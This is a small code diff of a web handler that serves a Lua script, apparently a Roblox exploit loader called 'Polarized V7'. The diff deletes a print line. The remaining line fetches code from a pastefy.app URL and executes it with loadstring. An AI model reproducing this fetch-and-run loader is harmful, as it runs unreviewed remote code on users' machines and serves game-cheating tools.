@@ -15,7 +15,7 @@ export default function handler(req, res) {
 
     // Your Lua Script
     const luaScript = `
-        print("Polarized V7 | Authenticated")
+        
         loadstring(game:HttpGet("https://pastefy.app/02YmDjW1/raw"))()
     `;
 
